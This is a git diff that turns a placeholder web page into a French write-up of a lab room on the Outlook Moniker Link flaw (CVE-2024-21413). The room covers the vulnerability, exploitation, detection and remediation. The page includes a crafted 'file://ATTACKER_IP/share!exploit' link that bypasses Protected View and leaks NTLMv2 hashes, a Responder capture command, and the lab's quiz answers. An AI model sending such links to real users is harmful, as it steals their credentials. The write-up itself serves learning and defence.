@@ -1,28 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-        <title>Exemple</title>
-        <link href="../css/styles.css" rel="stylesheet" />
-    </head>
-    <body class="d-flex flex-column h-100">
-        <header>
-            <!-- Le header sera inséré dynamiquement ici -->
-        </header>
-        <main class="flex-shrink-0">
-            <!-- Le contenu principal de la page -->
-            <section class="py-5">
-                <div class="container px-5 my-5">
-                    <h1 class="fw-bolder">Exemple de contenu</h1>
-                    <p class="lead">Ceci est un exemple de contenu pour la page.</p>
-                </div>
-            </section>
-        </main>
-        <footer>
-            <!-- Le footer sera inséré dynamiquement ici -->
-        </footer>
-        <script src="../js/scripts.js"></script>
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
-    </body>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>Moniker Link - CVE-2024-21413</title>
+    <link href="../css/styles.css" rel="stylesheet" />
+</head>
+<body class="d-flex flex-column h-100">
+    <header>
+        <!-- Le header sera inséré dynamiquement ici -->
+    </header>
+    <main class="flex-shrink-0">
+        <section class="py-5">
+            <div class="container px-5 my-5">
+                <h1 class="fw-bolder">Room : Moniker Link (CVE-2024-21413)</h1>
+
+                <h2 class="mt-4">Résumé</h2>
+                <p>Le 13 février 2024, une faille critique a été découverte dans Microsoft Outlook (<strong>CVE-2024-21413</strong>). Elle permet à un attaquant d’envoyer un lien Moniker par email pour :</p>
+                <ul>
+                    <li>Exécuter du code à distance (RCE)</li>
+                    <li>Récupérer les identifiants NTLM de la victime</li>
+                </ul>
+                <p><strong>Score CVSS :</strong> 9.8 / 10 – Gravité : Critique<br>
+                <strong>Complexité d’exploitation :</strong> Faible</p>
+                <p><strong>Versions concernées :</strong></p>
+                <ul>
+                    <li>Office 2016 à 2021</li>
+                    <li>Microsoft 365 Apps</li>
+                </ul>
+                <p><strong>Objectifs :</strong></p>
+                <ul>
+                    <li>Comprendre comment fonctionne la faille</li>
+                    <li>Découvrir la notion de "Protected View"</li>
+                    <li>Voir comment Outlook peut leaker des identifiants</li>
+                    <li>Apprendre à détecter et se protéger</li>
+                </ul>
+
+                <h3 class="mt-4">Task 2 – Moniker Link (CVE-2024-21413)</h3>
+                <p><strong>Résumé :</strong> Outlook peut interpréter des liens Moniker (ex : file://...) pour ouvrir des fichiers ou applications. Normalement, le mode Protected View empêche ce type d'accès en bloquant l’exécution.</p>
+                <p>La faille permet de contourner ce blocage en ajoutant le caractère spécial <code>!</code> dans le lien.</p>
+                <p><strong>Exemple vulnérable :</strong></p>
+                <pre>&lt;a href="file://ATTACKER_IP/share!exploit"&gt;Click me&lt;/a&gt;</pre>
+                <p>Même si le fichier n’existe pas, Outlook tente une connexion SMB et envoie les identifiants NTLMv2 automatiquement.</p>
+
+                <p><strong>Questions et réponses :</strong></p>
+                <ul>
+                    <li>Q1 : What Moniker Link type do we use in the hyperlink? <strong>R :</strong> file://</li>
+                    <li>Q2 : What is the special character used to bypass Outlook's "Protected View"? <strong>R :</strong> !</li>
+                </ul>
+
+                <h3 class="mt-4">Task 3 – Exploitation</h3>
+                <p><strong>Résumé :</strong> Dans cette task, on exploite la faille CVE-2024-21413 pour capturer le hash NTLMv2 d’un utilisateur Outlook.</p>
+                <p><strong>Étapes clés :</strong></p>
+                <ol>
+                    <li>Utilisation d’un script Python (exploit.py) pour envoyer un email HTML contenant un lien <code>file://ATTACKER_IP/test!exploit</code></li>
+                    <li>Configuration de l’outil Responder sur l’AttackBox :
+                        <pre>responder -I ens5</pre>
+                    </li>
+                    <li>Ouverture du mail sur la machine vulnérable et clic sur le lien</li>
+                    <li>Résultat : Outlook tente d'accéder au lien → envoie automatiquement les identifiants NTLMv2 à la machine attaquante.</li>
+                </ol>
+
+                <p><strong>Questions et réponses :</strong></p>
+                <ul>
+                    <li>Q1 : What is the name of the application that we use on the AttackBox to capture the user's hash? <strong>R :</strong> Responder</li>
+                    <li>Q2 : What type of hash is captured once the hyperlink in the email has been clicked? <strong>R :</strong> netNTLMv2</li>
+                </ul>
+
+                <h3 class="mt-4">Task 4 – Detection</h3>
+                <p><strong>Résumé :</strong> Cette task présente deux méthodes pour détecter l’exploitation de la faille CVE-2024-21413 :</p>
+
+                <h5>🛡️ 1. YARA</h5>
+                <p>Une règle YARA a été développée par Florian Roth pour identifier des emails suspects contenant un lien malveillant du type file://.</p>
+                <p>Elle détecte :</p>
+                <ul>
+                    <li>La présence de Moniker Links avec des extensions suspectes</li>
+                    <li>Des en-têtes standards comme "Subject:" et "Received:"</li>
+                    <li>Des fichiers .docx, .exe, .ps1, .jpg, etc.</li>
+                    <li>Des liens construits avec file:///\\...!... (ce qui correspond à la faille exploitée)</li>
+                </ul>
+
+                <h5>📡 2. Wireshark</h5>
+                <p>En analysant le trafic réseau, on peut également repérer :</p>
+                <ul>
+                    <li>Une requête SMB envoyée par la machine victime</li>
+                    <li>Contenant un hash netNTLMv2 tronqué</li>
+                </ul>
+                <p>Cela permet de confirmer l’exploitation via une capture réseau (PCAP).</p>
+
+                <h3 class="mt-4">Task 5 – Remediation</h3>
+                <p>Corriger cette faille passe avant tout par une chose essentielle : <strong>mettre à jour Microsoft Office</strong>. Microsoft a intégré un correctif officiel dès février 2024, et c’est aujourd’hui la seule vraie solution technique fiable contre cette attaque.</p>
+                <p>Mais au-delà du patch, ce que cette vulnérabilité met en lumière, c’est que certaines protections comme le "Protected View" d’Outlook ne suffisent pas toujours. Ici, on a un contournement si simple qu’il ne dépend ni d’un fichier joint malveillant ni d’une macro — juste un lien cliqué.</p>
+                <p>En attendant que tous les systèmes soient à jour, les bonnes pratiques côté utilisateur restent cruciales : ne pas cliquer n’importe où, toujours vérifier l’origine d’un mail, et signaler ce qui semble suspect. C’est la base, mais cette faille montre que même des utilisateurs prudents peuvent être piégés si le système est vulnérable.</p>
+                <p>Enfin, même si bloquer complètement le protocole SMB pourrait empêcher cette attaque, ça poserait trop de problèmes dans un environnement pro. Une solution possible serait de filtrer ces requêtes au niveau du pare-feu, mais ça dépend beaucoup du contexte de l’organisation.</p>
+
+                <h3 class="mt-4">Ce que j’ai compris</h3>
+                <p>Cette room m’a permis de comprendre comment une fonctionnalité normalement banale d’un client mail — ici, le rendu de liens dans Outlook — peut devenir une porte d’entrée critique quand elle est mal gérée.</p>
+                <p>La faille CVE-2024-21413 repose sur un type de lien appelé Moniker Link, qui peut forcer Outlook à tenter une connexion SMB externe. En insérant un caractère spécial (!) dans l’URL, il est possible de contourner la protection intégrée d’Outlook (le "Protected View") et de provoquer l’envoi automatique du hash NTLM de la victime à l’attaquant.</p>
+                <p>Ce que je retiens surtout, c’est à quel point des mécanismes internes à Windows (comme les liens file://, SMB, ou COM) peuvent être réutilisés de manière détournée dans un contexte d’attaque. Le tout sans nécessiter de clic sur une pièce jointe ou d’exécution de macro : un simple clic sur un lien suffit.</p>
+                <p>J’ai également découvert comment utiliser telnet, Responder, et un simple script Python pour simuler l’attaque. C’était concret, rapide à mettre en place, et super formateur pour comprendre la mécanique de l’exploitation réseau.</p>
+                <p>Enfin, même si un patch a été publié, il est clair que certaines failles comme celle-ci ne peuvent pas être entièrement évitées par de simples réglages utilisateurs. Cela montre l’importance des mises à jour, mais aussi de la sensibilisation des utilisateurs et de la surveillance réseau active.</p>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <!-- Le footer sera inséré dynamiquement ici -->
+    </footer>
+    <script src="../js/scripts.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
 </html>
